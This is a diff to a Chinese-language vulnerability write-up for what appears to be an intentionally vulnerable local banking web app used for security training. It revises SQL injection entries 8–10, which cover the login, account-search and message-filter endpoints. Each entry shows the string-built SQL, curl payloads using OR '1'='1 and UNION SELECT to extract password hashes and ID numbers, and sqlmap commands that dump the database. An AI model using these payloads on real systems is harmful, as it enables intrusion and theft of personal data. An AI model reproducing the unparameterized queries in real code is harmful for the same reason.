@@ -190,109 +190,136 @@ curl -X POST "http://localhost:5000/api/transfer" \
 
 ---
 
-### 漏洞8：SQL注入 —— 用户搜索接口（字符串型）
+### 漏洞8：SQL注入 —— 登录接口用户名字段（字符串型）
 
-**漏洞位置**：`GET /api/user/search`（`app.py` 第255行，`api_user_search` 函数）
+**漏洞位置**：`POST /login`（`app.py`，`login` 函数）
 
-**漏洞描述**：`keyword` 参数通过字符串格式化直接拼入 SQL 的 `LIKE` 子句，未使用参数化查询，攻击者可通过闭合引号注入任意 SQL 语句。
+**漏洞描述**：登录时将 `username` 表单字段直接拼入 SQL 查询用户记录，未使用参数化查询。攻击者可通过在用户名中注入 SQL 语句进行布尔盲注或联合查询，枚举数据库中的任意数据。
 
-**触发条件**：登录后携带 Session Cookie 访问该接口，传入恶意 `keyword` 参数。
+**触发条件**：在登录页面的用户名输入框中输入注入语句，无需任何权限。
 
-**漏洞代码片段**（`app.py`）：
+**漏洞代码片段**（`app.py`，`login` 函数）：
 ```python
-raw_sql = f"""
-    SELECT id, username, real_name, phone
-    FROM users
-    WHERE username LIKE '%{keyword}%'
-       OR real_name LIKE '%{keyword}%'
-    ORDER BY id DESC LIMIT 20
-"""
-result = db.session.execute(text(raw_sql))
+row = db.session.execute(
+    text(f"SELECT id FROM users WHERE username = '{username}'")
+).fetchone()
+user = User.query.get(row[0]) if row else None
 ```
 
 **手工验证**：
 ```bash
-# 正常请求
-curl -b "session=<你的Cookie>" "http://localhost:5000/api/user/search?keyword=zhang"
+# 布尔盲注：用户名注入单引号，服务器返回"用户名或密码错误"即可确认
+curl -X POST "http://localhost:5000/login" \
+  -d "username=' OR '1'='1&password=wrong"
 
-# 注入验证（万能条件，返回所有用户）
-curl -b "session=<你的Cookie>" \
-  "http://localhost:5000/api/user/search?keyword=%' OR '1'='1"
-
-# 联合查询注入（获取密码哈希）
-curl -b "session=<你的Cookie>" \
-  "http://localhost:5000/api/user/search?keyword=%' UNION SELECT id,username,password_hash,phone FROM users-- "
+# 联合查询 —— 枚举所有用户名（需配合密码字段响应差异）
+curl -X POST "http://localhost:5000/login" \
+  -d "username=' UNION SELECT id FROM users WHERE id=1--&password=any"
 ```
 
 **sqlmap 扫描命令**：
 ```bash
-# 先登录获取 Cookie，再使用 sqlmap 扫描
-sqlmap -u "http://localhost:5000/api/user/search?keyword=test" \
-  --cookie="session=<登录后的Session Cookie>" \
+# 对登录接口的 username 字段进行扫描
+sqlmap -u "http://localhost:5000/login" \
+  --data="username=test&password=test" \
   --dbms=sqlite \
-  --level=3 --risk=2 \
-  --technique=U \
+  -p username \
+  --level=2 --risk=1 \
+  --technique=BT \
   --dump
 ```
 
 ---
 
-### 漏洞9：SQL注入 —— 交易记录查询接口（数字型，最易利用）
+### 漏洞9：SQL注入 —— 账户交易记录搜索（字符串型）
 
-**漏洞位置**：`GET /api/transactions`（`app.py`，`api_get_transactions` 函数）
+**漏洞位置**：`GET /api/account/<id>?keyword=`（`app.py`，`api_get_account` 函数）
 
-**漏洞描述**：`account_id` 参数为数字型，直接拼接进 SQL，**无引号包裹，无需任何绕过**，是最经典、最容易被 sqlmap 自动检测的注入类型。且接口将数据库报错信息原样返回，支持报错注入。
+**漏洞描述**：账户详情接口支持通过 `keyword` 参数按备注关键字搜索交易记录，该参数被直接拼入 SQL 的 `LIKE` 子句，未做参数化处理。攻击者可通过闭合引号注入任意 SQL，配合 UNION 查询获取其他表的数据。
 
-**触发条件**：登录后携带 Session Cookie 访问 `/api/transactions?account_id=<注入载荷>`。
+**触发条件**：登录后访问自己的账户详情，传入恶意 `keyword` 参数。
 
-**漏洞代码片段**（`app.py`）：
+**漏洞代码片段**（`app.py`，`api_get_account` 函数）：
 ```python
-# account_id 直接拼入 SQL，无引号，无过滤
-raw_sql = (
-    f"SELECT id, trans_type, amount, balance_after, description, created_at "
-    f"FROM transactions WHERE account_id = {account_id} "
-    f"ORDER BY created_at DESC LIMIT 20"
-)
-result = db.session.execute(text(raw_sql))
+trans_sql = f"""
+    SELECT id, trans_type, amount, balance_after, description, target_account, created_at
+    FROM transactions
+    WHERE account_id = {account_id}
+      AND (description LIKE '%{keyword}%' OR target_account LIKE '%{keyword}%')
+    ORDER BY created_at DESC LIMIT 50
+"""
+rows = db.session.execute(text(trans_sql)).fetchall()
 ```
 
 **手工验证**：
 ```bash
-# 正常请求（返回账户1的交易记录）
-curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1"
+# 正常请求
+curl -b "session=<Cookie>" "http://localhost:5000/api/account/1?keyword=转账"
 
-# 布尔盲注验证（两条结果不同则存在注入）
-curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1 AND 1=1"
-curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1 AND 1=2"
+# 注入验证（万能条件，返回全部交易记录）
+curl -b "session=<Cookie>" \
+  "http://localhost:5000/api/account/1?keyword=%' OR '1'='1"
 
-# UNION联合查询（获取所有用户名和密码哈希）
-curl -b "session=<你的Cookie>" \
-  "http://localhost:5000/api/transactions?account_id=0 UNION SELECT id,username,password_hash,email,phone,created_at FROM users--"
+# UNION联合查询（读取所有用户的用户名和密码哈希）
+curl -b "session=<Cookie>" \
+  "http://localhost:5000/api/account/1?keyword=%' UNION SELECT id,username,password_hash,phone,email,created_at FROM users-- "
 ```
 
-**sqlmap 一键扫描**：
+**sqlmap 扫描命令**：
 ```bash
-# 步骤1：登录系统，从浏览器开发者工具或 curl 响应头中获取 Session Cookie
-
-# 步骤2：使用 sqlmap 扫描（数字型注入，level=1 即可检出）
-sqlmap -u "http://localhost:5000/api/transactions?account_id=1" \
+# 先登录系统获取 Session Cookie，再执行
+sqlmap -u "http://localhost:5000/api/account/1?keyword=test" \
   --cookie="session=<登录后的Session Cookie>" \
   --dbms=sqlite \
-  --dump
-
-# 步骤3：一键拖库（获取所有表数据）
-sqlmap -u "http://localhost:5000/api/transactions?account_id=1" \
-  --cookie="session=<登录后的Session Cookie>" \
-  --dbms=sqlite \
-  --dump-all \
-  --batch
+  --level=3 --risk=2 \
+  --technique=U \
+  --dump-all --batch
 ```
 
-**可获取的敏感数据**：
-- 所有用户的用户名、密码哈希值
-- 完整银行卡号、持卡人姓名
-- 账户余额、全量交易记录
-- 用户身份证号、手机号、住址
+---
+
+### 漏洞10：SQL注入 —— 消息列表类型筛选（字符串型）
+
+**漏洞位置**：`GET /api/messages?type=`（`app.py`，`api_get_messages` 函数）
+
+**漏洞描述**：消息列表接口支持通过 `type` 参数按消息类型筛选，该参数被直接拼入 SQL 查询，未使用参数化处理。攻击者可通过注入绕过 `user_id` 限制，读取其他用户的消息，或进一步进行 UNION 查询获取任意数据。
+
+**触发条件**：登录后访问消息中心，在 `type` 参数中传入注入语句。
+
+**漏洞代码片段**（`app.py`，`api_get_messages` 函数）：
+```python
+sql = f"""
+    SELECT id, title, msg_type, is_read, created_at
+    FROM messages
+    WHERE user_id = {current_user.id} AND msg_type = '{msg_type}'
+    ORDER BY created_at DESC
+"""
+rows = db.session.execute(text(sql)).fetchall()
+```
+
+**手工验证**：
+```bash
+# 正常请求
+curl -b "session=<Cookie>" "http://localhost:5000/api/messages?type=系统通知"
+
+# 注入绕过 user_id，读取所有用户的全部消息
+curl -b "session=<Cookie>" \
+  "http://localhost:5000/api/messages?type=' OR '1'='1"
+
+# UNION联合查询（读取所有用户身份证号）
+curl -b "session=<Cookie>" \
+  "http://localhost:5000/api/messages?type=' UNION SELECT id,real_name,id_card,is_read,created_at FROM users-- "
+```
+
+**sqlmap 扫描命令**：
+```bash
+sqlmap -u "http://localhost:5000/api/messages?type=test" \
+  --cookie="session=<登录后的Session Cookie>" \
+  --dbms=sqlite \
+  --level=2 --risk=1 \
+  --technique=BU \
+  --dump-all --batch
+```
 
 ## 漏洞修复方案
 
